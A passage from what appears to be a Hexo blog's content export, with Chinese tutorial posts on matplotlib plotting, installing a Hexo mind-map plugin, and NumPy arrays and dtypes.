numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="comment"># Fixing random state for reproducibility</span></span><br><span class="line">np.random.seed(<span class="number">19680801</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randrange</span>(<span class="params">n, vmin, vmax</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Helper function to make an array of random numbers having shape (n, )</span></span><br><span class="line"><span class="string">    with each number distributed Uniform(vmin, vmax).</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> (vmax - vmin)*np.random.rand(n) + vmin</span><br><span class="line">fig = plt.figure()</span><br><span class="line">ax = fig.add_subplot(<span class="number">111</span>, projection=<span class="string">&#x27;3d&#x27;</span>)</span><br><span class="line">n = <span class="number">100</span></span><br><span class="line"><span class="comment"># For each set of style and range settings, plot n random points in the box</span></span><br><span class="line"><span class="comment"># defined by x in [23, 32], y in [0, 100], z in [zlow, zhigh].</span></span><br><span class="line"><span class="keyword">for</span> m, zlow, zhigh <span class="keyword">in</span> [(<span class="string">&#x27;o&#x27;</span>, <span class="number">-50</span>, <span class="number">-25</span>), (<span class="string">&#x27;^&#x27;</span>, <span class="number">-30</span>, <span class="number">-5</span>)]:</span><br><span class="line">    xs = randrange(n, <span class="number">23</span>, <span class="number">32</span>)</span><br><span class="line">    ys = randrange(n, <span class="number">0</span>, <span class="number">100</span>)</span><br><span class="line">    zs = randrange(n, zlow, zhigh)</span><br><span class="line">    ax.scatter(xs, ys, zs, marker=m)</span><br><span class="line"></span><br><span class="line">ax.set_xlabel(<span class="string">&#x27;X Label&#x27;</span>)</span><br><span class="line">ax.set_ylabel(<span class="string">&#x27;Y Label&#x27;</span>)</span><br><span class="line">ax.set_zlabel(<span class="string">&#x27;Z Label&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><ul><li>3D平面</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> cm</span><br><span class="line"><span class="keyword">from</span> matplotlib.ticker <span class="keyword">import</span> LinearLocator, FormatStrFormatter</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">fig = plt.figure()</span><br><span class="line">ax = fig.gca(projection=<span class="string">&#x27;3d&#x27;</span>)</span><br><span class="line"><span class="comment"># Make data.</span></span><br><span class="line">X = np.arange(<span class="number">-5</span>, <span class="number">5</span>, <span class="number">0.25</span>)</span><br><span class="line">Y = np.arange(<span class="number">-5</span>, <span class="number">5</span>, <span class="number">0.25</span>)</span><br><span class="line">X, Y = np.meshgrid(X, Y)</span><br><span class="line">R = np.sqrt(X**<span class="number">2</span> + Y**<span class="number">2</span>)</span><br><span class="line">Z = np.sin(R)</span><br><span class="line"><span class="comment"># Plot the surface.</span></span><br><span class="line">surf = ax.plot_surface(X, Y, Z, cmap=cm.coolwarm,</span><br><span class="line">                       linewidth=<span class="number">0</span>, antialiased=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># Customize the z axis.</span></span><br><span class="line">ax.set_zlim(<span class="number">-1.01</span>, <span class="number">1.01</span>)</span><br><span class="line">ax.zaxis.set_major_locator(LinearLocator(<span class="number">10</span>))</span><br><span class="line">ax.zaxis.set_major_formatter(FormatStrFormatter(<span class="string">&#x27;%.02f&#x27;</span>))</span><br><span class="line"><span class="comment"># Add a color bar which maps values to colors.</span></span><br><span class="line">fig.colorbar(surf, shrink=<span class="number">0.5</span>, aspect=<span class="number">5</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h2 id="矩阵可视化"><a class="markdownIt-Anchor" href="#矩阵可视化"></a> 矩阵可视化</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">samplemat</span>(<span class="params">dims</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Make a matrix with all zeros and increasing elements on the diagonal&quot;&quot;&quot;</span></span><br><span class="line">    aa = np.zeros(dims)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(min(dims)):</span><br><span class="line">        aa[i, i] = i</span><br><span class="line">    <span class="keyword">return</span> aa</span><br><span class="line"><span class="comment"># Display matrix</span></span><br><span class="line">plt.matshow(samplemat((<span class="number">15</span>, <span class="number">15</span>)))</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h2 id="混淆矩阵"><a class="markdownIt-Anchor" href="#混淆矩阵"></a> 混淆矩阵</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">%matplotlib inline</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">plot_confusion_matrix</span>(<span class="params">cm,</span></span></span><br><span class="line"><span class="function"><span class="params">                          target_names,</span></span></span><br><span class="line"><span class="function"><span class="params">                          title=<span class="string">&#x27;Confusion matrix&#x27;</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                          cmap=None,</span></span></span><br><span class="line"><span class="function"><span class="params">                          normalize=True</span>):</span></span><br><span class="line">    accuracy = np.trace(cm) / float(np.sum(cm))</span><br><span class="line">    misclass = <span class="number">1</span> - accuracy</span><br><span class="line">    <span class="keyword">if</span> cmap <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        cmap = plt.get_cmap(<span class="string">&#x27;Blues&#x27;</span>)</span><br><span class="line">    plt.figure(figsize=(<span class="number">8</span>, <span class="number">6</span>))</span><br><span class="line">    plt.imshow(cm, interpolation=<span class="string">&#x27;nearest&#x27;</span>, cmap=cmap)</span><br><span class="line">    plt.title(title)</span><br><span class="line">    plt.colorbar()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> target_names <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        tick_marks = np.arange(len(target_names))</span><br><span class="line">        plt.xticks(tick_marks, target_names, rotation=<span class="number">45</span>)</span><br><span class="line">        plt.yticks(tick_marks, target_names)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> normalize:</span><br><span class="line">        cm = cm.astype(<span class="string">&#x27;float&#x27;</span>) / cm.sum(axis=<span class="number">1</span>)[:, np.newaxis]</span><br><span class="line">    thresh = cm.max() / <span class="number">1.5</span> <span class="keyword">if</span> normalize <span class="keyword">else</span> cm.max() / <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> itertools.product(range(cm.shape[<span class="number">0</span>]), range(cm.shape[<span class="number">1</span>])):</span><br><span class="line">        <span class="keyword">if</span> normalize:</span><br><span class="line">            plt.text(j, i, <span class="string">&quot;&#123;:0.4f&#125;&quot;</span>.format(cm[i, j]),</span><br><span class="line">                     horizontalalignment=<span class="string">&quot;center&quot;</span>,</span><br><span class="line">                     color=<span class="string">&quot;white&quot;</span> <span class="keyword">if</span> cm[i, j] &gt; thresh <span class="keyword">else</span> <span class="string">&quot;black&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            plt.text(j, i, <span class="string">&quot;&#123;:,&#125;&quot;</span>.format(cm[i, j]),</span><br><span class="line">                     horizontalalignment=<span class="string">&quot;center&quot;</span>,</span><br><span class="line">                     color=<span class="string">&quot;white&quot;</span> <span class="keyword">if</span> cm[i, j] &gt; thresh <span class="keyword">else</span> <span class="string">&quot;black&quot;</span>)</span><br><span class="line">    plt.tight_layout()</span><br><span class="line">    plt.ylabel(<span class="string">&#x27;True label&#x27;</span>)</span><br><span class="line">    plt.xlabel(<span class="string">&#x27;Predicted label\naccuracy=&#123;:0.4f&#125;; misclass=&#123;:0.4f&#125;&#x27;</span>.format(accuracy, misclass))</span><br><span class="line">    plt.show()</span><br><span class="line">plot_confusion_matrix(cm           = np.array([[ <span class="number">1098</span>,  <span class="number">1934</span>,   <span class="number">807</span>],</span><br><span class="line">                                              [  <span class="number">604</span>,  <span class="number">4392</span>,  <span class="number">6233</span>],</span><br><span class="line">                                              [  <span class="number">162</span>,  <span class="number">2362</span>, <span class="number">31760</span>]]), </span><br><span class="line">                      normalize    = <span class="literal">False</span>,</span><br><span class="line">                      target_names = [<span class="string">&#x27;high&#x27;</span>, <span class="string">&#x27;medium&#x27;</span>, <span class="string">&#x27;low&#x27;</span>],</span><br><span class="line">                      title        = <span class="string">&quot;Confusion Matrix&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="热图"><a class="markdownIt-Anchor" href="#热图"></a> 热图</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">vegetables = [<span class="string">&quot;cucumber&quot;</span>, <span class="string">&quot;tomato&quot;</span>, <span class="string">&quot;lettuce&quot;</span>, <span class="string">&quot;asparagus&quot;</span>,</span><br><span class="line">              <span class="string">&quot;potato&quot;</span>, <span class="string">&quot;wheat&quot;</span>, <span class="string">&quot;barley&quot;</span>]</span><br><span class="line">farmers = [<span class="string">&quot;Farmer Joe&quot;</span>, <span class="string">&quot;Upland Bros.&quot;</span>, <span class="string">&quot;Smith Gardening&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Agrifun&quot;</span>, <span class="string">&quot;Organiculture&quot;</span>, <span class="string">&quot;BioGoods Ltd.&quot;</span>, <span class="string">&quot;Cornylee Corp.&quot;</span>]</span><br><span class="line">harvest = np.array([[<span class="number">0.8</span>, <span class="number">2.4</span>, <span class="number">2.5</span>, <span class="number">3.9</span>, <span class="number">0.0</span>, <span class="number">4.0</span>, <span class="number">0.0</span>],</span><br><span class="line">                    [<span class="number">2.4</span>, <span class="number">0.0</span>, <span class="number">4.0</span>, <span class="number">1.0</span>, <span class="number">2.7</span>, <span class="number">0.0</span>, <span class="number">0.0</span>],</span><br><span class="line">                    [<span class="number">1.1</span>, <span class="number">2.4</span>, <span class="number">0.8</span>, <span class="number">4.3</span>, <span class="number">1.9</span>, <span class="number">4.4</span>, <span class="number">0.0</span>],</span><br><span class="line">                    [<span class="number">0.6</span>, <span class="number">0.0</span>, <span class="number">0.3</span>, <span class="number">0.0</span>, <span class="number">3.1</span>, <span class="number">0.0</span>, <span class="number">0.0</span>],</span><br><span class="line">                    [<span class="number">0.7</span>, <span class="number">1.7</span>, <span class="number">0.6</span>, <span class="number">2.6</span>, <span class="number">2.2</span>, <span class="number">6.2</span>, <span class="number">0.0</span>],</span><br><span class="line">                    [<span class="number">1.3</span>, <span class="number">1.2</span>, <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">3.2</span>, <span class="number">5.1</span>],</span><br><span class="line">                    [<span class="number">0.1</span>, <span class="number">2.0</span>, <span class="number">0.0</span>, <span class="number">1.4</span>, <span class="number">0.0</span>, <span class="number">1.9</span>, <span class="number">6.3</span>]])</span><br><span class="line"></span><br><span class="line">plt.figure(figsize=(<span class="number">16</span>,<span class="number">16</span>))</span><br><span class="line">fig, ax = plt.subplots()</span><br><span class="line">im = ax.imshow(harvest)</span><br><span class="line"><span class="comment"># We want to show all ticks...</span></span><br><span class="line">ax.set_xticks(np.arange(len(farmers)))</span><br><span class="line">ax.set_yticks(np.arange(len(vegetables)))</span><br><span class="line"><span class="comment"># ... and label them with the respective list entries</span></span><br><span class="line">ax.set_xticklabels(farmers)</span><br><span class="line">ax.set_yticklabels(vegetables)</span><br><span class="line"><span class="comment"># Rotate the tick labels and set their alignment.</span></span><br><span class="line">plt.setp(ax.get_xticklabels(), rotation=<span class="number">45</span>, ha=<span class="string">&quot;right&quot;</span>,</span><br><span class="line">         rotation_mode=<span class="string">&quot;anchor&quot;</span>)</span><br><span class="line"><span class="comment"># Loop over data dimensions and create text annotations.</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(vegetables)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(farmers)):</span><br><span class="line">        text = ax.text(j, i, harvest[i, j],</span><br><span class="line">                       ha=<span class="string">&quot;center&quot;</span>, va=<span class="string">&quot;center&quot;</span>, color=<span class="string">&quot;w&quot;</span>)</span><br><span class="line">ax.set_title(<span class="string">&quot;Harvest of local farmers (in tons/year)&quot;</span>)</span><br><span class="line"><span class="comment">#fig.tight_layout()</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h1 id="图像显示"><a class="markdownIt-Anchor" href="#图像显示"></a> 图像显示</h1><ul><li>在Matplotlib中绘制图像的最常见方法是使用imshow()</li><li>PIL（Python Imaging Library）是Python常用的图像处理库，而Pillow是PIL的一个友好Fork，提供了广泛的文件格式支持，强大的图像处理能力，主要包括图像储存、图像显示、格式转换以及基本的图像处理操作等</li></ul><h2 id="图像插值"><a class="markdownIt-Anchor" href="#图像插值"></a> 图像插值</h2><ul><li>插值方式分为：nearest bilinear bicubic</li><li>不同的插值方法将多个具有不同大小的图像相互层叠。 复杂的内插还意味着性能下降； 为了获得最佳性能或非常大的图像，建议使用插值interpolation=‘nearest’</li></ul><h2 id="将图像数据导入numpy数组"><a class="markdownIt-Anchor" href="#将图像数据导入numpy数组"></a> 将图像数据导入Numpy数组</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">img = mpimg.imread(<span class="string">&#x27;cat.png&#x27;</span>)</span><br><span class="line">print(img)</span><br></pre></td></tr></table></figure><h2 id="将numpy数组绘制为图像"><a class="markdownIt-Anchor" href="#将numpy数组绘制为图像"></a> 将numpy数组绘制为图像</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">imgplot = plt.imshow(img)</span><br></pre></td></tr></table></figure><h2 id="使用pil操作图像"><a class="markdownIt-Anchor" href="#使用pil操作图像"></a> 使用PIL操作图像</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.open(<span class="string">&#x27;cat.png&#x27;</span>)</span><br><span class="line">gray = img.convert(<span class="string">&#x27;L&#x27;</span>) <span class="comment"># 　其中img.convert指定一种色彩模式：L (8-bit pixels, black and white)</span></span><br><span class="line"><span class="comment"># 分离rgba</span></span><br><span class="line">r, g, b, a  = img.split()  </span><br><span class="line">plt.figure(<span class="string">&quot;girl&quot;</span>)</span><br><span class="line"><span class="comment"># src</span></span><br><span class="line">plt.subplot(<span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>)</span><br><span class="line">plt.title(title)</span><br><span class="line">plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">plt.imshow(img)</span><br><span class="line"><span class="comment"># grey r g b a</span></span><br></pre></td></tr></table></figure><h2 id="伪彩色"><a class="markdownIt-Anchor" href="#伪彩色"></a> 伪彩色</h2><ul><li>使用colormap根据灰度图生成彩色的图像</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">lum_img = img[:, :, <span class="number">0</span>]</span><br><span class="line"><span class="comment"># This is array slicing.  </span></span><br><span class="line">plt.imshow(lum_img)</span><br><span class="line">plt.imshow(lum_img, cmap=<span class="string">&quot;hot&quot;</span>)</span><br><span class="line"><span class="comment"># 设定</span></span><br><span class="line"><span class="comment"># imgplot.set_cmap(&#x27;nipy_spectral&#x27;)</span></span><br><span class="line">plt.colorbar() <span class="comment"># 色系参考</span></span><br></pre></td></tr></table></figure><h2 id="检查特定数据范围"><a class="markdownIt-Anchor" href="#检查特定数据范围"></a> 检查特定数据范围</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">plt.hist(lum_img.ravel(), bins=<span class="number">256</span>, range=(<span class="number">0.0</span>, <span class="number">1.0</span>), fc=<span class="string">&#x27;k&#x27;</span>, ec=<span class="string">&#x27;k&#x27;</span>)</span><br><span class="line">imgplot = plt.imshow(lum_img, clim=(<span class="number">0</span>, <span class="number">0.7</span>))</span><br><span class="line"><span class="comment"># imgplot.set_clim(0.0, 0.7)</span></span><br></pre></td></tr></table></figure><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> programme </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>添加思维导图</title>
      <link href="/2020/08/20/%E6%B7%BB%E5%8A%A0%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"/>
      <url>/2020/08/20/%E6%B7%BB%E5%8A%A0%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>思维导图</p></blockquote><a id="more"></a><h1 id="安装"><a class="markdownIt-Anchor" href="#安装"></a> 安装</h1><ul><li>博客根目录安装</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-simple-mindmap</span><br></pre></td></tr></table></figure><h1 id="添加格式"><a class="markdownIt-Anchor" href="#添加格式"></a> 添加格式</h1><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% pullquote mindmap mindmap-md %&#125;</span><br><span class="line"><span class="bullet">-</span> [<span class="string">Hexo 的思维导图插件</span>](<span class="link">https://hunterx.xyz/hexo-simple-mindmap-plugin-intro.html</span>)</span><br><span class="line"><span class="bullet">  -</span> 前言</span><br><span class="line"><span class="bullet">  -</span> 使用方法</span><br><span class="line"><span class="bullet">    -</span> 一</span><br><span class="line"><span class="bullet">    -</span> 二</span><br><span class="line"><span class="bullet">    -</span> 三</span><br><span class="line"><span class="bullet">  -</span> 太长不看</span><br><span class="line"><span class="bullet">  -</span> 参考资料</span><br><span class="line">&#123;% endpullquote %&#125;</span><br></pre></td></tr></table></figure><h1 id="效果"><a class="markdownIt-Anchor" href="#效果"></a> 效果</h1><blockquote class="pullquote mindmap mindmap-md"><ul><li><a href="diofapsdiufaposidufpaosidufpaosidufpaosidufpaosdiufpaosidufpaosidufaposidfuaposdifuddddddddddddddddddddddddddddddddfpaosidu%5Cnfpaosidufpaosdiufpaosidufpaosidufaposidfuaposdifuddddddddddddddddddddddddddddddddfpaosidufpaosidufpaosdiufpaosidufpaosidufaposidfuaposdifuddddddddddddddddddddddddddddddddfpaosidufpaosidufpaosdiufpaosidufpaosidufaposidfuaposdifudddddddddddddddddddddddddddddddd">Hexo 的思维导图插件</a><ul><li>前言</li><li>使用方法<ul><li>一</li><li>二</li><li>三</li></ul></li><li>太长不看</li><li>参考资料</li></ul></li></ul></blockquote><blockquote><p>看了下源代码，实现了标签和link的提取，通过链接还可以实现备注的功能，只不过符号被url编码了😄</p></blockquote><p><a href="https://zhuanlan.zhihu.com/p/75467441">原文链接</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> common </category>
          
      </categories>
      
      
        <tags>
            
            <tag> skills </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>numpy</title>
      <link href="/2020/08/18/numpy/"/>
      <url>/2020/08/18/numpy/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>numpy基本使用汇总</p></blockquote><a id="more"></a><h1 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h1><ul><li><p><a href="https://numpy.org/">官方网址</a></p></li><li><p>NumPy代表“Numerical Python”，是一个由多维数组对象和用于处理这些数组的例程(routines)所组成的库。 使用NumPy，可以对数组执行数学和逻辑运算。NumPy不是另一种编程语言，而是Python扩展模块。它对同类数据的数组(array)提供快速有效的操作。 NumPy将Python扩展为用于处理数值数据的高级语言，类似于MATLAB。</p></li><li><p>NumPy主要是用C编写的。这确保了Numpy的数学和数值函数及功能的执行速度。NumPy通过强大的数据结构丰富了编程语言Python，实现了多维数组和矩阵。这些数据结构可确保通过矩阵和数组进行有效的计算。除此之外，该模块还提供了一个庞大的高级数学函数库，可以对这些矩阵和数组进行操作。NumPy是SciPy、Pandas等科学计算或数据处理库的基础。</p></li><li><p>在Python中使用Numpy的优点：</p><ul><li>面向数组（array）的计算</li><li>有效实施的多维数组</li><li>专为科学计算而设计</li></ul></li></ul><h1 id="numpyndarray类"><a class="markdownIt-Anchor" href="#numpyndarray类"></a> numpy.ndarray类</h1><ul><li>Python已有列表类型，但是如果做运算非常不方便。numpy.ndarray类作为数组对象类型可以实现：<ul><li>数组对象可以去掉元素间运算所需的循环，使一维向量更像单个数据</li><li>设置专门的数组对象，经过优化，可以提升这类应用的运算速度</li><li>数组对象采用相同的数据类型，有助于节省运算和存储空间</li></ul></li><li>ndarray的N维数组类型，它描述了相同类型的元素的集合(collection)。可以使用从零开始的索引来访问集合中的元素。</li><li>所有ndarray都是同质的(homogenous)：每个item占用相同大小的内存块，并且所有块的解释方式都完全相同。数组中各元素的解释方式由一个数据类型对象（称为dtype）指定。除了基本类型（整数，浮点数等）之外，数据类型对象还可以表示数据结构。</li></ul><h2 id="内部构成"><a class="markdownIt-Anchor" href="#内部构成"></a> 内部构成</h2><ul><li>ndarray是一个多维数组对象，包括：<ul><li>数据类型对象（dtype）：描述这些数据的元数据（数据维度、数据类型等）</li><li>数组标量(array scalar)类型：实际的数据</li></ul></li></ul><p><img src="/images/pasted-83.png" alt="ndarray" /></p><h3 id="数组标量-array-scalar"><a class="markdownIt-Anchor" href="#数组标量-array-scalar"></a> 数组标量 (array scalar)</h3><ul><li>Python标量非常少，数组标量实现了数据类型的扩充，在大多数情况下它们可以互换使用。</li><li>使用数组标量的主要优点是它们保留了数组类型（Python可能没有可用的匹配的标量类型，例如int16）。因此，使用数组标量可以确保数组和标量之间的行为相同，而与值是否在数组内部无关。</li></ul><h3 id="数据类型对象dtype"><a class="markdownIt-Anchor" href="#数据类型对象dtype"></a> 数据类型对象（dtype）</h3><ul><li>数据类型对象描述了应该如何解释与数组元素相对应的固定大小的内存块中的字节。</li><li>在dtype的帮助下，我们能够创建“结构化数组”（“Structured Arrays”），也称为“记录数组”（“Record Arrays”）。结构化数组使我们能够为每列提供不同的数据类型。它与excel或csv文档的结构相似。</li></ul><table><thead><tr><th>描述</th><th>说明</th></tr></thead><tbody><tr><td>数据类型</td><td>整数，浮点数，Python对象等</td></tr><tr><td>数据大小</td><td>以整数为单位的字节数</td></tr><tr><td>数据的字节顺序</td><td>小端或大端</td></tr><tr><td>如果数据类型是结构化数据类型，则是其他数据类型的集合</td><td>例如，描述由整数和浮点数组成的一个数组元素<br>* 该结构的字段（field）的名称是什么，通过它们可以访问它们；<br>* 每个字段的数据类型是什么；<br>* 每个字段占用存储块的哪一部分。</td></tr><tr><td>如果数据类型是子数组(sub-array)，则其形状和数据类型是什么</td><td></td></tr></tbody></table><h4 id="大端序和小端序"><a class="markdownIt-Anchor" href="#大端序和小端序"></a> 大端序和小端序</h4><ul><li><p><strong>大端模式 (big-endian)</strong>：是指数据的高字节保存在内存的低地址中，而数据的低字节保存在内存的高地址中，这样的存储模式有点儿类似于把数据当作字符串顺序处理：地址由小向大增加，而数据从高位往低位放；这和我们的阅读习惯一致。</p></li><li><p><strong>小端模式 (little-endian)</strong>：是指数据的高字节保存在内存的高地址中，而数据的低字节保存在内存的低地址中，这种存储模式将地址的高低和数据位权有效地结合起来，高地址部分权值高，低地址部分权值低，和我们的逻辑方法一致。</p></li><li><p>例如一个16bit的short型x，在内存中的地址为0x0010，x的值为0x1122，那么0x11为高字节，0x22为低字节。</p><ul><li>对于大端模式，就将0x11放在低地址中，即0x0010中，0x22放在高地址中，即0x0011中。</li><li>小端模式，刚好相反。</li></ul></li><li><p>我们常用的X86结构是小端模式，而KEIL C51则为大端模式。很多的ARM，DSP都为小端模式。</p></li></ul><h4 id="dtype类型"><a class="markdownIt-Anchor" href="#dtype类型"></a> dtype类型</h4><table><thead><tr><th>dtype类型</th><th>说明</th></tr></thead><tbody><tr><td>dt = np.dtype(‘b’)</td><td>byte, native byte order</td></tr><tr><td>dt = np.dtype(’&gt;H’)</td><td>big-endian unsigned short</td></tr><tr><td>dt = np.dtype(’&lt;f’)</td><td>little-endian single-precision float</td></tr><tr><td>dt = np.dtype(‘d’)</td><td>double-precision floating-point number</td></tr><tr><td>dt = np.dtype(‘i4’)</td><td>32-bit signed integer</td></tr><tr><td>dt = np.dtype(‘f8’)</td><td>64-bit floating-point number</td></tr><tr><td>dt = np.dtype(‘c16’)</td><td>128-bit complex floating-point number</td></tr><tr><td>dt = np.dtype(‘a25’)</td><td>25-length zero-terminated bytes</td></tr><tr><td>dt = np.dtype(‘U25’)</td><td>25-character string</td></tr><tr><td>dt = np.dtype(“i4, (2,3)f8, f4”)</td><td>* field named f0 containing a 32-bit integer<br>* field named f1 containing a 2 x 3 sub-array of 64-bit floating-point numbers<br>* field named f2 containing a 32-bit floating-point number</td></tr></tbody></table><h4 id="dtype属性"><a class="markdownIt-Anchor" href="#dtype属性"></a> dtype属性</h4><ul><li>dt = np.dtype(’&gt;i4’)</li></ul><table><thead><tr><th>dtype属性</th><th>说明</th></tr></thead><tbody><tr><td>dt.byteorder</td><td>‘&gt;’：大端序小端序判断</td></tr><tr><td>dt.itemsize</td><td>4：每项数据的字节大小</td></tr><tr><td><a href="http://dt.name">dt.name</a></td><td>int32：类型名称</td></tr><tr><td>dt.type is np.int32</td><td>True：对应的np类型</td></tr></tbody></table><h4 id="dtype使用"><a class="markdownIt-Anchor" href="#dtype使用"></a> dtype使用</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">i16 = np.dtype(np.int16)</span><br><span class="line">print(i16)</span><br><span class="line">lst = [ [<span class="number">3.4</span>, <span class="number">8.7</span>, <span class="number">9.9</span>], </span><br><span class="line">        [<span class="number">1.1</span>, <span class="number">-7.8</span>, <span class="number">-0.7</span>],</span><br><span class="line">        [<span class="number">4.1</span>, <span class="number">12.3</span>, <span class="number">4.8</span>] ]</span><br><span class="line">A = np.array(lst, dtype=i16)</span><br><span class="line">print(A)</span><br></pre></td></tr></table></figure><h3 id="ndarray对象"><a class="markdownIt-Anchor" href="#ndarray对象"></a> ndarray对象</h3><ul><li>ndarray对象由计算机内存中连续一维segment组成，并与将每个元素映射到内存块中某个位置的索引方案结合在一起。内存块按行优先顺序（C style）或列优先顺序（FORTRAN或MatLab style）保存元素。</li></ul><p><img src="/images/pasted-84.png" alt="行优先、列优先" /></p><ul><li>ndarray的数组是“ N维数组”的简写。N维数组只是具有任意数量维度的数组。用于表示矩阵和向量。</li></ul><table><thead><tr><th>维度</th><th>表述</th></tr></thead><tbody><tr><td>一维数组</td><td>向量，分为行向量和列向量</td></tr><tr><td>两维数组</td><td>矩阵</td></tr><tr><td>三维或更高维数组</td><td>通常使用张量(tensor)这一术语</td></tr></tbody></table><h3 id="数组属性"><a class="markdownIt-Anchor" href="#数组属性"></a> 数组属性</h3><ul><li>数组通常是具有相同类型和大小的元素的固定大小的容器。数组属性反映了数组本身固有的信息。</li></ul><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>ndarray.ndim</td><td>秩，即轴的数量或维度的数量</td></tr><tr><td>ndarray.shape</td><td>数组的维度，对于矩阵，n 行 m 列</td></tr><tr><td>ndarray.size</td><td>数组元素的总个数，相当于 .shape 中 n* m 的值</td></tr><tr><td>ndarray.dtype</td><td>ndarray 对象的元素类型</td></tr><tr><td>ndarray.itemsize</td><td>ndarray 对象中每个元素的大小，以字节为单位</td></tr><tr><td>ndarray.flags</td><td>ndarray 对象的内存信息</td></tr><tr><td>ndarray.real</td><td>ndarray元素的实部</td></tr><tr><td>ndarray.imag</td><td>ndarray 元素的虚部</td></tr><tr><td>ndarray.data</td><td>包含实际数组元素的缓冲区。由于一般通过数组的索引获取元素，通常不需要使用这个属性。</td></tr></tbody></table><h4 id="shape"><a class="markdownIt-Anchor" href="#shape"></a> shape</h4><ul><li>数组中的维数和元素数由其形状(shape)定义。</li></ul><h4 